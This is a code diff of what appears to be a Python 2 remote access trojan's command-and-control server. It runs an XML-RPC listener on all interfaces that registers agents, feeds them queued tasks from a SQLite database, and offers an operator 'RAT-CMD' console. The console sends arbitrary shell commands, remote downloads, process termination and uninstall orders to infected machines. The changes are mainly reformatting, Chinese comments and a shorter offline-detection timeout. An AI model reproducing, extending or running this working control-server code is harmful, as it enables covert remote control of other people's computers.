@@ -1,17 +1,23 @@
 #! /usr/bin/env python
-#coding=utf-8
+# coding=utf-8
 
 import time, sys, os
 import threading
 import xmlrpclib
 from SimpleXMLRPCServer import SimpleXMLRPCServer
 from svrdb import SvrDb
-#http://blog.csdn.net/qianghaohao/article/details/52117082
+# http://blog.csdn.net/qianghaohao/article/details/52117082
 from colorama import init, Fore, Back, Style
 
+
 class SvrMethod():
+    """
+    服务端口的注册函数
+    客户端连接上来以后会执行执行的函数
+    """
     tsk = None
-    #@staticmethod
+
+    # @staticmethod
     @classmethod
     def set_taskmgr(cls, taskmgr):
         SvrMethod.tsk = taskmgr
@@ -22,16 +28,18 @@ class SvrMethod():
         self.i = 0
 
     def hello(self, id, ver, info):
-        print (Fore.RED + id +' is online.')
+        print (Fore.RED + id + ' is online.')
         self.tsk.hello(id, ver, info)
         self.tsk.new_cmd()
 
     def get_task(self, id):
+        # 更新agent 信息 这里会更新agent的lasttime 用于判断机器是不是存在
         self.db.upd_client(id)
+
+        # 数据库中捞出任务发给agent 执行
         task = self.db.get_task(id)
         if task == 'uninstall':
             self.tsk.del_cur_client()
-
         return task
 
     def resp_task(self, id, task_id, task, argv, ret, data):
@@ -74,7 +82,12 @@ class SvrMethod():
         print id, 'is offline.'
         self.tsk.new_cmd()
 
+
 class SvrTask(threading.Thread):
+    """
+    用户执行程序的任务管理
+    """
+
     def __init__(self):
         super(SvrTask, self).__init__()
         self.cmdmap = {
@@ -92,7 +105,7 @@ class SvrTask(threading.Thread):
             'terminate': self.terminate_proc
         }
         self.cur_cid = None
-        #SQLite objects created in a thread can only be used in that same thread.The object was created in thread id 34828 and this is thread id 8960
+        # SQLite objects created in a thread can only be used in that same thread.The object was created in thread id 34828 and this is thread id 8960
         # 连接db
         self.db = SvrDb("svr.db")
         self.cmd_dir = None
@@ -112,11 +125,11 @@ class SvrTask(threading.Thread):
     def run(self):
         while True:
             cmd = raw_input('cmd >').strip()
-            if cmd == 'quit' or cmd =='q':
-                #for debug, wait
+            if cmd == 'quit' or cmd == 'q':
+                # for debug, wait
                 self.db.add_task(self.cur_cid, 'quit')
                 print 'Quit server'
-                os._exit(0)#sys.exit(0)
+                os._exit(0)  # sys.exit(0)
             if len(cmd) == 1:
                 tmp = [k for k in self.cmdmap.keys() if k.startswith(cmd)]
                 if len(tmp) <= 0:
@@ -146,7 +159,7 @@ class SvrTask(threading.Thread):
         print '(q)uit:     quit server'
 
     def new_cmd(self):
-        #print self.pre_cmd_tip,
+        # print self.pre_cmd_tip,
         sys.stdout.write('\r')
         sys.stdout.write(self.pre_cmd_tip)
         sys.stdout.flush()
@@ -239,11 +252,20 @@ class SvrTask(threading.Thread):
         return True
 
     def _check_client(self, c):
+        """
+        根据时间差 判断这个主机是不是在线
+        :param c:
+        :return:
+        """
         cid_index = 1
         time_index = 8
-        time_diff = 2*60
+        # time_diff = 2 * 60
+        # 调灵敏一点 掉线了 马上知道
+        time_diff = 5
         last_time = time.mktime(time.strptime(c[time_index], "%Y-%m-%d %H:%M:%S"))
+        # 时间差超过2分钟了
         diff = time.time() - last_time
+        # print diff
         if diff >= time_diff:
             self.db.off_client(c[cid_index])
             print '%s offline %s!' % (c[cid_index], c[time_index])
@@ -251,6 +273,11 @@ class SvrTask(threading.Thread):
         return True
 
     def check_client(self, check_all=False):
+        """
+        每次发消息时候查看机器有也没有下线
+        :param check_all:
+        :return:
+        """
         '''check status of the client in every cmd.'''
         if check_all:
             clients = self.db.list_alive_client()
@@ -298,7 +325,7 @@ class SvrTask(threading.Thread):
         if self.has_client():
             dtype = 'net'
             url = raw_input("url(type N to download local file):")
-            if url ==  'N':
+            if url == 'N':
                 url = self.downlocal()
                 if not url:
                     return
@@ -353,12 +380,12 @@ class SvrTask(threading.Thread):
         if self.has_client():
             while True:
                 self.pre_cmd_tip = Fore.GREEN + 'RAT-CMD > '
-                cmd = raw_input(Fore.GREEN +'RAT-CMD > ').strip()
+                cmd = raw_input(Fore.GREEN + 'RAT-CMD > ').strip()
                 # 检查是不是有这个客户端 没退
                 if not self.check_client():
                     self.cur_cid = None
                     return
-                #just for debug
+                # just for debug
                 if cmd:
                     if cmd == 'quit' or cmd == 'q':
                         self.pre_cmd_tip = 'cmd > '
@@ -371,10 +398,11 @@ class SvrTask(threading.Thread):
                         cmd = "cd " + self.cmd_dir + ' && ' + cmd
                     self.db.add_task(self.cur_cid, 'cmdshell', cmd)
 
+
 class XMLSvr():
     def __init__(self, port):
         self.svrtask = SvrTask()
-        SvrMethod.set_taskmgr(self.svrtask) #在SvrMethod()前
+        SvrMethod.set_taskmgr(self.svrtask)  # 在SvrMethod()前
         self.svr = SimpleXMLRPCServer(("0.0.0.0", port), logRequests=False, allow_none=True)
         self.svr.register_instance(SvrMethod())
 
@@ -382,21 +410,26 @@ class XMLSvr():
         self.svrtask.start()
         self.svr.serve_forever()
 
+
 # 在使用本方法之前，请先做如下import
 # from __future__ import division
 import math
+
+
 # import sys
 # ##blog.useasp.net##
 def progressbar(cur, total):
-    percent = '{:.2%}'.format(cur*1.0 / total)
+    percent = '{:.2%}'.format(cur * 1.0 / total)
     sys.stdout.write('\r')
-    sys.stdout.write("[%-50s] %s" % ( '=' * int(math.floor(cur * 50 / total)), percent))
+    sys.stdout.write("[%-50s] %s" % ('=' * int(math.floor(cur * 50 / total)), percent))
     sys.stdout.flush()
+
 
 def test():
     for i in xrange(0, 100):
         progressbar(i, 100)
         time.sleep(1)
+
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
